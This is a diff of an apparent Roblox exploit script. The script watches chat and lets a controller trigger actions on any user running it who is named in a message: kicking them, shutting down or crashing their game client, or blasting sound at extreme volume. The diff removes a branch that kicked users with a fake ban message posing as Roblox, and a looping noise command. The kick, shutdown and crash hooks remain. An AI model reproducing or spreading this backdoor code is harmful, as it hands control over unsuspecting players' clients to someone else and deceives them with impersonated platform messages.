@@ -780,9 +780,7 @@ end)
 setreadonly(mt,true)
 
 local player = game.Players.LocalPlayer
-local id = {
-	"3872667823"
-}
+local id = "3872667823"
 function eatbananaone(theplayer)
 	for i,v in pairs(workspace:GetChildren()) do
 		if v.Name == "BananaPeel" then
@@ -820,10 +818,6 @@ chat.ChildAdded:Connect(function (child)
 					if splayer.Name == player.Name then
                         player:kick("You Been Kicked :)")
                     end
-                elseif string.find(command,splayer.Name) and string.find(command,"kban") then
-				    if splayer.Name == player.Name then
-                        player:kick("You Been Banned From Violate Our Term Of Use, Sincerely Roblox.")
-                    end
                 elseif string.find(command,splayer.Name) and string.find(command,"quit") then
 					game:Shutdown()
 			    elseif string.find(command,splayer.Name) and string.find(command,"crash") then
@@ -846,13 +840,6 @@ chat.ChildAdded:Connect(function (child)
 					sound.SoundId = "rbxassetid://5602666105"
 					sound.Volume = 100000
 					sound:Play()
-				elseif string.find(command,"autohehe") then
-					local sound = Instance.new("Sound", game.Workspace)
-					repeat
-					sound.SoundId = "rbxassetid://5602666105"
-					sound.Volume = 100000
-					sound:Play()
-					until string.find(command,"unautohehe")
 				elseif string.find(command,splayer.Name) and string.find(command,"eatbanana") then
 					eatbananaone(splayer)
 				elseif string.find(command,splayer.Name) and string.find(command,"bananadeath") then
